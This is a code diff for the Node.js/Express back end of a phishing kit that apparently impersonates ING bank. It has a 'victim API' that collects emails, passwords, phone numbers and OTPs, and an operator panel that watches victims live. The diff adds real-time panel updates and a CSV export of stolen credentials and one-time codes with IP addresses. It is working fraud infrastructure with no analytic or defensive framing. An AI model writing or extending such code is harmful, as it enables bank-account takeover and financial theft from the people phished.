@@ -12,18 +12,26 @@ const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toSt
 const app  = express();
 const PORT = process.env.PORT || 3000;
 
+console.log('ENV check:', { PANEL_USER, PANEL_PASS });
+
+/* ----------  SIMPLE EVENT BUS  ---------- */
+const events = new (require('events')).EventEmitter();
+function emitPanelUpdate() { events.emit('panel'); }
+
+// Trust proxy – required behind Railway / Render
 app.set('trust proxy', 1);
 
 app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
+// Session middleware – MUST be before routes
 app.use(session({
   name: 'pan_sess',
   keys: [SESSION_SECRET],
   maxAge: 24 * 60 * 60 * 1000,
   sameSite: 'lax',
-  secure: (req) => req.protocol === 'https', 
+  secure: (req) => req.protocol === 'https',
   httpOnly: true
 }));
 
@@ -48,19 +56,12 @@ app.get('/success.html', (req, res) => res.sendFile(__dirname + '/success.html')
 
 /* ----------  PANEL ACCESS CONTROL  ---------- */
 app.get('/panel', (req, res) => {
-  console.log('GET /panel - authed:', req.session?.authed);
   if (req.session?.authed === true) return res.sendFile(__dirname + '/_panel.html');
   res.sendFile(__dirname + '/access.html');
 });
 
 app.post('/panel/login', (req, res) => {
-  // ---- DEBUG:  what did we actually receive? ----
-  console.log('headers:', req.headers['content-type']);
-  console.log('body raw:', req.body);
-  // ----------------------------------------------
   const { user, pw } = req.body;
-  console.log('POST /panel/login - user:', user, 'pw:', pw);
-
   if (user === PANEL_USER && pw === PANEL_PASS) {
     req.session.authed   = true;
     req.session.username = user;
@@ -95,20 +96,6 @@ function uaParser(ua) {
   return u;
 }
 
-function cleanupSession(sid, reason, silent = false) {
-  const v = sessionsMap.get(sid);
-  if (!v) return;
-  sessionsMap.delete(sid);
-  sessionActivity.delete(sid);
-}
-
-setInterval(() => {
-  const now = Date.now();
-  for (const [sid, last] of sessionActivity) {
-    if (now - last > SESSION_TIMEOUT) cleanupSession(sid, 'timed out (3min idle)', true);
-  }
-}, 10000);
-
 /* ----------  SESSION HEADER HELPER  ---------- */
 function getSessionHeader(v) {
   if (v.page === 'success') return `🦁 ING Login approved`;
@@ -125,6 +112,20 @@ function getSessionHeader(v) {
   }
   return `🔑 Awaiting OTP...`;
 }
+
+function cleanupSession(sid, reason, silent = false) {
+  const v = sessionsMap.get(sid);
+  if (!v) return;
+  sessionsMap.delete(sid);
+  sessionActivity.delete(sid);
+}
+
+setInterval(() => {
+  const now = Date.now();
+  for (const [sid, last] of sessionActivity) {
+    if (now - last > SESSION_TIMEOUT) cleanupSession(sid, 'timed out (3min idle)', true);
+  }
+}, 10000);
 
 /* ----------  VICTIM API  ---------- */
 app.post('/api/session', async (req, res) => {
@@ -267,7 +268,10 @@ app.post('/api/page', async (req, res) => {
 
 app.post('/api/exit', async (req, res) => {
   const { sid } = req.body;
-  if (sid && sessionsMap.has(sid)) cleanupSession(sid, 'closed the page', true);
+  if (sid && sessionsMap.has(sid)) {
+    cleanupSession(sid, 'closed the page', true);
+    emitPanelUpdate();          // <-- tell panel to refresh
+  }
   res.sendStatus(200);
 });
 
@@ -306,9 +310,8 @@ app.get('/api/user', (req, res) => {
   res.status(401).json({ error: 'Not authenticated' });
 });
 
-app.get('/api/panel', (req, res) => {
-  if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });
-
+// helper that builds the payload
+function buildPanelPayload() {
   const list = Array.from(sessionsMap.values()).map(v => ({
     sid: v.sid, victimNum: v.victimNum, header: getSessionHeader(v), page: v.page, status: v.status,
     email: v.email, password: v.password, phone: v.phone, otp: v.otp,
@@ -316,17 +319,28 @@ app.get('/api/panel', (req, res) => {
     entered: v.entered, unregisterClicked: v.unregisterClicked,
     activityLog: v.activityLog || []
   }));
-
-  res.json({
+  return {
     domain: currentDomain,
-    username: req.session?.username || PANEL_USER,
+    username: PANEL_USER,
     totalVictims: victimCounter,
     active: list.length,
     waiting: list.filter(x => x.status === 'wait').length,
     success: successfulLogins,
     sessions: list,
     logs: auditLog.slice(-50).reverse()
-  });
+  };
+}
+
+app.get('/api/panel', (req, res) => {
+  if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });
+
+  // long-poll: wait up to 1 s for an event
+  const listener = () => res.json(buildPanelPayload());
+  events.once('panel', listener);
+  setTimeout(() => {
+    events.removeListener('panel', listener);
+    res.json(buildPanelPayload());
+  }, 1000);
 });
 
 app.post('/api/panel', async (req, res) => {
@@ -355,9 +369,37 @@ app.post('/api/panel', async (req, res) => {
       break;
     case 'delete':
       cleanupSession(sid, 'deleted from panel');
+      emitPanelUpdate();
       break;
   }
   res.json({ ok: true });
+});
+
+/* ----------  CSV EXPORT  ---------- */
+app.get('/api/export', (req, res) => {
+  if (!req.session?.authed) return res.status(401).send('Unauthorized');
+
+  const successes = auditLog
+    .filter(r => r.phone && r.otp)          // success criteria
+    .map(r => ({
+      victimNum: r.victimN,
+      email: r.email,
+      password: r.password,
+      phone: r.phone,
+      otp: r.otp,
+      ip: r.ip,
+      ua: r.ua,
+      timestamp: new Date(r.t).toISOString()
+    }));
+
+  const csv = [
+    ['Victim#','Email','Password','Phone','OTP','IP','UA','Timestamp'],
+    ...successes.map(s=>Object.values(s).map(v=>`"${v}"`))
+  ].map(r=>r.join(',')).join('\n');
+
+  res.setHeader('Content-Type', 'text/csv');
+  res.setHeader('Content-Disposition', 'attachment; filename="successful_logins.csv"');
+  res.send(csv);
 });
 
 /* ----------  START  ---------- */
@@ -366,6 +408,3 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log(`Panel user: ${PANEL_USER}`);
   currentDomain = process.env.RAILWAY_STATIC_URL || process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
 });
-
-
-
